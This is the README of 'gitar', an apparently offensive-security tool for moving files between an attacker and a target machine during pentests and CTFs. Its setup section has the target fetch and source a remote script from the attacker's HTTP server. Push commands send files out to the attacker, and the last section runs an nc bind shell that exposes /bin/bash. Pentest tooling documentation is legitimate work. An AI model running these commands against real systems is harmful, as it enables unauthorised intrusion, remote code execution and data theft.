<div align=center>
<h1>gitar</h1>
<img src=https://github.com/ariary/gitar/blob/main/img/gitar-logo.png width=150>
	
<strong>📡 A more sophisticated python HTTP server sibling <br>🎸 focusing on having the simplest interactions for file exchange (Pentest/CTF)<br>🎵 with additional functionalities: <a href=#send-mode>quick file sending</a> and <a href=#webhook-mode>HTTP webhook logging</a> </strong>
<br>
</div>

|![demo](https://github.com/ariary/gitar/blob/main/img/gitar-screen.png)|
|:---:|
|**~>** Have the  ***simplest possible shortcuts*** to upload/download file to/from the target machine<br>**~>** ***No installation needed*** on target machine<br>**~>** ***Fast and simple*** deployment|



## TL;DR *- and listen music*

On my target machine:
 - **Download a file** from my attacker machine: `pull [file]` *(with filename completion)*
 - **Download a directory** from my attacker machine: `pullr [directory]` *(with filename completion)*
 - **Upload a file** to my attacker machine: `push [file]`
 - **Upload a directory** to my attacker machine: `pushr [directory]`

*Before be able to use these shortcut you have to [set up](#set-up) both machines. Once again, the aim is to made it as simple as possible*

## Set up


### 🎸 Launch `gitar` server 
 
On **Attacker machine**: 
```shell
gitar
```

On **Target machine**:

```shell
# Get shortcuts and source them. The one-liner corresponding is by default copy on clipboard. 
# It is also provided by step 1. (in gitar output):
source <(curl -s http://[attacker_ip:port]/alias)
```

**And that's all, you can now `push` or `pull` file [🎶](#tldr---and-listen-music)**

 <sup>[`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files)</sup>

### 🐋 Secure launch of `gitar` server

This is basicaly the same as launching `gitar` server. But as we expose our http server we become the prey. Hence we must harden a bit the server. To do this we launch `gitar` inside a container and use HTTPS.

The following steps expose files of current directory. Files uploaded by remote are written inside current directory also.

On **Attacker machine**: 
```shell
docker run -it --rm --net host --cap-drop=all --cap-add=dac_override --user $(id -u):$(id -g)  -v "${PWD}:/gitar/exchange" ariary/gitar
```

**You can now `push`or `pull` file being more safe [🎶](#tldr---and-listen-music)**



<sup>[`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files-safely)</sup>

### Pre-requisites

* HTTP Network connectivity between attacker & target machines
* On target machine: `curl` 
	* `tar` for directory upload 
* On attacker machine: 
	* `xclip` to copy command on clipboard (not required)
	* `tree`: to expose it trough server (not required)
	* `dig`: to automatically find extarnal IP (not required)

The aim is to keep "target requirements" as fit as possible. Attacker machine requirements are not a big deal as we have plenty control over it and time to configure it.

## Additional Functionalities

### `send` mode

Use this mode to quickly send a file to a target machine using different method/protocol. The advantage is that you do not have to remember the command line (if required field is not specified with flags it will be asked in a prompt).

It also has a kind of memory. with the `-l` flag it will use the previous configuration to send the file.
```shell
# send /img folder using scp with user root to target.com
gitar send scp -t target.com -u root /img
# now send exploit.sh to the same hsot
gitar send -l exploit.sh
```

### `webhook` mode

Use this mode if you want to have some logs about incoming HTTP requests. It enables us to:
* Log request information
	* request parameter values
	* request header values
* Override response
	* header 
* Forward request to another http server (~ local logging middleware)
* Serve directory
```shell
# log incoming request and retrieve payload parameter value
gitar webhook -P payload
```
## Install

```shell
go install github.com/ariary/gitar@latest
```

## Bonus

### Bidirectional exchange

You can also use `push` and `pull` shortcuts from attacker machine, after shortcuts have been loaded on target. It does not require addtional requirements on both machines. To do so it is recommended to load `alias` (put them in your `~/[SHELL]rc`) and launch gitar as follow:
```shell
gtrclean
gitar -bidi
```

On another attacker terminal window you can now push file to remote:
```shell
gtrbidi #to load gitar shortcut
push [FILENAME]

#[...] when your exchange is done
gtrclean 
```

***Notes:*** It will push files on remote within the directory where the `source` command occurs

#### 🐋 Container and bidirectional exchange
```shell
BIDIR=$(mktemp -d);docker run -it --rm --cap-drop=all --cap-add=dac_override --net host --user $(id -u):$(id -g)  -v "${PWD}:/gitar/exchange" -v "$BIDIR:$BIDIR" ariary/gitar -bidi -bd $BIDIR
```

Then on attacker machine load shortcut:
```shell
gtrbidi.docker
```

#### Limits
* Only work for file (does not work for `pullr` and `pushr`)
* Increase considerably the number of http requests on target

### Load shortcut directly in your reverse shell

**~>** *Below are the steps to have shortcuts directly embedded in your `nc` reverse shell*

On **Target machine**:
```shell
# Launch your classic listener
nc -nvlp 4444 -e /bin/bash
```

On **Attacker machine**:

1. Launch `gitar`server : `gitar -e [server_reachable_ip]` *(By default this will copy on clipboard the command to set up gitar exchange, also available in server output)*
2. Connect to the reverse shell + load shortcut within:`nc [VICTIM_IP] 4444` then `[CTRL+V]` 

An alternative is `export CMD=[CTRL+V] && (echo $CMD && cat) | nc [VICTIM_IP] 4444` *(Note: with `cat` you will not benefit of bash completion)*

**And enjoy you revshell [🎶](#tldr---and-listen-music)**


	
	
